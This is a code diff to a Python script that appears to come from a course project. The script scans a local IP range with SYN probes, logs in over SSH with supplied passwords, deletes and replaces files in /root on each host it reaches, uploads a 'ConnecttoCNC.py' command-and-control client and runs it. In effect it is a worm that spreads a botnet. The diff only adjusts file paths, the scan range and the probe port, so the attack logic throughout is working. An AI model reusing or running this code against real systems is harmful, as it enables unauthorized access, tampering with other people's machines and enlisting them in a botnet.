@@ -1,6 +1,7 @@
 from scapy.all import *
 import paramiko
 import threading
+import os
 
 paramiko.util.log_to_file("connections.log")
 clientslist = list()
@@ -10,20 +11,22 @@ successclients = list()
 listofopenipaddresses = list()
 mutex = threading.Lock()
 searchdone = False
+
+print('working directory = ', os.getcwd())
+
 def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
 	try:
 		client = paramiko.SSHClient()
 		client.load_system_host_keys()
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		client.connect(ipaddresses,password=passwordsource)
-		print('SSHed into', ipaddresses)
 		client.exec_command('rm /root/ConnecttoCNC.py')
 		client.exec_command('touch /root/ConnecttoCNC.py')
 		client.exec_command('rm /root/Config.txt')
 		client.exec_command('touch Config.txt')
 		sftp = client.open_sftp()
-		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
-		sftp.put('/root/CS445-Project/Config.txt', '/root/Config.txt')
+		sftp.put(os.getcwd() + '/ConnecttoCNC.py','/root/ConnecttoCNC.py')
+		sftp.put(os.getcwd() + '/Config.txt', '/root/Config.txt')
 		successfullyconnectedclients.append(client)
 	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
 		return None
@@ -40,11 +43,12 @@ def generaterangeofipstoconnect(rangestr):
 
 def findtargets():
 	global listofopenipaddresses
-	for index in range(105,110):
+	global mutex
+	for index in range(107,115):
 		ipaddress = IP_RANGE + '.' + str(index)
 		print('Current IP check = ', ipaddress)
 		if ipaddress != TARGET:
-			answer = sr1(IP(dst=ipaddress)/TCP(dport=80,flags="S"),timeout=2)
+			answer = sr1(IP(dst=ipaddress)/TCP(flags="S"),timeout=2)
 			if answer != None:
 				mutex.acquire()
 				listofopenipaddresses.append(ipaddress)
@@ -99,6 +103,7 @@ if int(input_choice) == 1:
 
 				for successclientsiterator in successclients:
 					stdin,stdout,stderr = successclientsiterator.exec_command('python /root/ConnecttoCNC.py')
+		listofopenipaddresses = []
 		mutex.release()
 
 else:
